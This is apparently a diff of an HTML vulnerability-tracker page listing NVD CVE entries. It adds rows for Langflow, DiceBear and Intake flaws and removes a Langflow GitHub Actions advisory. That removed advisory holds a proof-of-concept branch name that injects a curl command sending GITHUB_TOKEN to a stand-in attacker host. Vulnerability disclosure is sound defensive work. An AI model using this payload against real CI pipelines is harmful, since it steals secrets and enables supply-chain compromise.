@@ -11,11 +11,11 @@
     <header>
       <h1>vuln-tracker</h1>
       <p class="subtitle">CVEs from the National Vulnerability Database — current and previous month</p>
-      <p class="last-updated">Last updated: 2026-03-24 13:25 UTC</p>
+      <p class="last-updated">Last updated: 2026-03-24 15:05 UTC</p>
     </header>
     <main>
     <section>
-      <h2>Current Month — March 2026 <span class="count">(4159)</span></h2>
+      <h2>Current Month — March 2026 <span class="count">(4162)</span></h2>
       <div class="table-wrapper">
         <table>
           <thead>
@@ -30,6 +30,51 @@
             </tr>
           </thead>
           <tbody>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33497" target="_blank" rel="noopener">CVE-2026-33497</a></td>
+        <td>8.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-22</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Langflow is a tool for building and deploying AI-powered agents and workflows. P...</summary><p>Langflow is a tool for building and deploying AI-powered agents and workflows. Prior to version 1.7.1, in the download_profile_picture function of the /profile_pictures/{folder_name}/{file_name} endpoint, the folder_name and file_name parameters are not strictly filtered, which allows the secret_key to be read across directories. Version 1.7.1 contains a patch.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33484" target="_blank" rel="noopener">CVE-2026-33484</a></td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-284</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Langflow is a tool for building and deploying AI-powered agents and workflows. I...</summary><p>Langflow is a tool for building and deploying AI-powered agents and workflows. In versions 1.0.0 through 1.8.1, the `/api/v1/files/images/{flow_id}/{file_name}` endpoint serves image files without any authentication or ownership check. Any unauthenticated request with a known flow_id and file_name returns the image with HTTP 200. In a multi-tenant deployment, any attacker who can discover or guess a `flow_id` (UUIDs can be leaked through other API responses) can download any user&#x27;s uploaded images without credentials. Version 1.9.0 contains a patch.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33418" target="_blank" rel="noopener">CVE-2026-33418</a></td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-185</td>
+        <td>&nbsp;</td>
+        <td><details><summary>DiceBear is an avatar library for designers and developers. Prior to version 9.4...</summary><p>DiceBear is an avatar library for designers and developers. Prior to version 9.4.2, the `ensureSize()` function in `@dicebear/converter` used a regex-based approach to rewrite SVG `width`/`height` attributes, capping them at 2048px to prevent denial of service. This size capping could be bypassed by crafting SVG input that causes the regex to match a non-functional occurrence of `&lt;svg` before the actual SVG root element. When the SVG is subsequently rendered via `@resvg/resvg-js` on the Node.js code path, it renders at the attacker-specified dimensions, potentially causing out-of-memory crashes. In version 9.4.2, the regex-based approach has been replaced with XML-aware processing using `fast-xml-parser` to correctly identify and modify the SVG root element&#x27;s attributes. Additionally, a `fitTo` constraint has been added to the `renderAsync` call as defense-in-depth, ensuring the rendered output is always bounded regardless of SVG content.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33311" target="_blank" rel="noopener">CVE-2026-33311</a></td>
+        <td>4.7</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-79</td>
+        <td>&nbsp;</td>
+        <td><details><summary>DiceBear is an avatar library for designers and developers. Starting in version ...</summary><p>DiceBear is an avatar library for designers and developers. Starting in version 5.0.0 and prior to versions 5.4.4, 6.1.4, 7.1.4, 8.0.3, and 9.4.1, SVG attribute values derived from user-supplied options (`backgroundColor`, `fontFamily`, `textColor`) were not XML-escaped before interpolation into SVG output. This could allow Cross-Site Scripting (XSS) when applications pass untrusted input to `createAvatar()` and serve the resulting SVG inline or with `Content-Type: image/svg+xml`. Starting in versions 5.4.4, 6.1.4, 7.1.4, 8.0.3, and 9.4.1, all affected SVG attribute values are properly escaped using XML entity encoding. Users should upgrade to the listed patched versions. Some mitigating factors limit vulnerability. Applications that validate input against the library&#x27;s JSON Schema before passing it to `createAvatar()` are not affected. The DiceBear CLI validates input via AJV and was not vulnerable. Exploitation requires that an application passes untrusted, unvalidated external input directly as option values.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33310" target="_blank" rel="noopener">CVE-2026-33310</a></td>
+        <td>8.8</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-78</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Intake is a package for finding, investigating, loading and disseminating data. ...</summary><p>Intake is a package for finding, investigating, loading and disseminating data. Prior to version 2.0.9, the shell() syntax within parameter default values appears to be automatically expanded during the catalog parsing process. If a catalog contains a parameter default such as shell(&lt;command&gt;), the command may be executed when the catalog source is accessed. This means that if a user loads a malicious catalog YAML, embedded commands could execute on the host system. Version 2.0.9 mitigates the issue by making getshell False by default everywhere.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4729" target="_blank" rel="noopener">CVE-2026-4729</a></td>
         <td>0.0</td>
@@ -433,91 +478,6 @@
         <td>N/A</td>
         <td>&nbsp;</td>
         <td><details><summary>Race condition, use-after-free in the Graphics: WebRender component. This vulner...</summary><p>Race condition, use-after-free in the Graphics: WebRender component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
-        <td>2026-03-24</td>
-      </tr>
-      <tr>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33475" target="_blank" rel="noopener">CVE-2026-33475</a></td>
-        <td>9.1</td>
-        <td><span class="severity critical">CRITICAL</span></td>
-        <td>CWE-74</td>
-        <td>&nbsp;</td>
-        <td><details><summary>Langflow is a tool for building and deploying AI-powered agents and workflows. A...</summary><p>Langflow is a tool for building and deploying AI-powered agents and workflows. An unauthenticated remote shell injection vulnerability exists in multiple GitHub Actions workflows in the Langflow repository prior to version 1.9.0. Unsanitized interpolation of GitHub context variables (e.g., `${{ github.head_ref }}`) in `run:` steps allows attackers to inject and execute arbitrary shell commands via a malicious branch name or pull request title. This can lead to secret exfiltration (e.g., `GITHUB_TOKEN`), infrastructure manipulation, or supply chain compromise during CI/CD execution. Version 1.9.0 patches the vulnerability.
-
----
-
-### Details
-
-Several workflows in `.github/workflows/` and `.github/actions/` reference GitHub context variables directly in `run:` shell commands, such as:
-
-```yaml
-run: |
-  validate_branch_name &quot;${{ github.event.pull_request.head.ref }}&quot;
-```
-
-Or:
-
-```yaml
-run: npx playwright install ${{ inputs.browsers }} --with-deps
-```
-
-Since `github.head_ref`, `github.event.pull_request.title`, and custom `inputs.*` may contain **user-controlled values**, they must be treated as **untrusted input**. Direct interpolation without proper quoting or sanitization leads to shell command injection.
-
----
-
-### PoC
-
-1. **Fork** the Langflow repository
-2. **Create a new branch** with the name:
-   ```bash
-   injection-test &amp;&amp; curl https://attacker.site/exfil?token=$GITHUB_TOKEN
-   ```
-3. **Open a Pull Request** to the main branch from the new branch
-4. GitHub Actions will run the affected workflow (e.g., `deploy-docs-draft.yml`)
-5. The `run:` step containing:
-   ```yaml
-   echo &quot;Branch: ${{ github.head_ref }}&quot;
-   ```
-   Will execute:
-   ```bash
-   echo &quot;Branch: injection-test&quot;
-   curl https://attacker.site/exfil?token=$GITHUB_TOKEN
-   ```
-
-6. The attacker receives the CI secret via the exfil URL.
-
----
-
-### Impact
-
-- **Type:** Shell Injection / Remote Code Execution in CI
-- **Scope:** Any public Langflow fork with GitHub Actions enabled
-- **Impact:** Full access to CI secrets (e.g., `GITHUB_TOKEN`), possibility to push malicious tags or images, tamper with releases, or leak sensitive infrastructure data
-
----
-
-### Suggested Fix
-
-Refactor affected workflows to **use environment variables** and wrap them in **double quotes**:
-
-```yaml
-env:
-  BRANCH_NAME: ${{ github.head_ref }}
-run: |
-  echo &quot;Branch is: \&quot;$BRANCH_NAME\&quot;&quot;
-```
-
-Avoid direct `${{ ... }}` interpolation inside `run:` for any user-controlled value.
-
----
-
-### Affected Files (Langflow `1.3.4`)
-
-- `.github/actions/install-playwright/action.yml`
-- `.github/workflows/deploy-docs-draft.yml`
-- `.github/workflows/docker-build.yml`
-- `.github/workflows/release_nightly.yml`
-- `.github/workflows/python_test.yml`
-- `.github/workflows/typescript_test.yml`</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
@@ -1739,7 +1699,7 @@ Avoid direct `${{ ... }}` interpolation inside `run:` for any user-controlled va
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1940" target="_blank" rel="noopener">CVE-2026-1940</a></td>
         <td>5.1</td>
         <td><span class="severity medium">MEDIUM</span></td>
-        <td>N/A</td>
+        <td>CWE-125</td>
         <td>&nbsp;</td>
         <td><details><summary>An incomplete fix for CVE-2024-47778 allows an out-of-bounds read in gst_wavpars...</summary><p>An incomplete fix for CVE-2024-47778 allows an out-of-bounds read in gst_wavparse_adtl_chunk() function. The patch added a size validation check lsize + 8 &gt; size, but it does not account for the GST_ROUND_UP_2(lsize) used in the actual offset calculation. When lsize is an odd number, the parser advances more bytes than validated, causing OOB read.</p></details></td>
         <td>2026-03-23</td>
@@ -2349,9 +2309,9 @@ Avoid direct `${{ ... }}` interpolation inside `run:` for any user-controlled va
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24516" target="_blank" rel="noopener">CVE-2026-24516</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>8.8</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-94</td>
         <td>&nbsp;</td>
         <td><details><summary>A command injection vulnerability exists in DigitalOcean Droplet Agent through 1...</summary><p>A command injection vulnerability exists in DigitalOcean Droplet Agent through 1.3.2. The troubleshooting actioner component (internal/troubleshooting/actioner/actioner.go) processes metadata from the metadata service endpoint and executes commands specified in the TroubleshootingAgent.Requesting array without adequate input validation. While the code validates that artifacts exist in the validInvestigationArtifacts map, it fails to sanitize the actual command content after the &quot;command:&quot; prefix. This allows an attacker who can control metadata responses to inject and execute arbitrary OS commands with root privileges. The attack is triggered by sending a TCP packet with specific sequence numbers to the SSH port, which causes the agent to fetch metadata from http://169.254.169.254/metadata/v1.json. The vulnerability affects the command execution flow in internal/troubleshooting/actioner/actioner.go (insufficient validation), internal/troubleshooting/command/exec.go (direct exec.CommandContext call), and internal/troubleshooting/command/command.go (command parsing without sanitization). This can lead to complete system compromise, data exfiltration, privilege escalation, and potential lateral movement across cloud infrastructure.</p></details></td>
         <td>2026-03-23</td>
@@ -33872,16 +33832,6 @@ Avoid direct `${{ ... }}` interpolation inside `run:` for any user-controlled va
         <td>CWE-613</td>
         <td>&nbsp;</td>
         <td><details><summary>2N Access Commander version 3.4.2 and prior improperly invalidates session token...</summary><p>2N Access Commander version 3.4.2 and prior improperly invalidates session tokens, allowing multiple session cookies to remain active after logout in web application.</p></details></td>
-        <td>2026-03-04</td>
-      </tr>
-      <tr>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-12801" target="_blank" rel="noopener">CVE-2025-12801</a></td>
-        <td>6.5</td>
-        <td><span class="severity medium">MEDIUM</span></td>
-        <td>CWE-279</td>
-        <td>&nbsp;</td>
-        <td><details><summary>A vulnerability was recently discovered in the rpc.mountd daemon in the nfs-util...</summary><p>A vulnerability was recently discovered in the rpc.mountd daemon in the nfs-utils package for Linux, that allows a NFSv3 client to escalate the
-privileges assigned to it in the /etc/exports file at mount time. In particular, it allows the client to access any subdirectory or subtree of an exported directory, regardless of the set file permissions, and regardless of any &#x27;root_squash&#x27; or &#x27;all_squash&#x27; attributes that would normally be expected to apply to that client.</p></details></td>
         <td>2026-03-04</td>
       </tr>
       <tr>
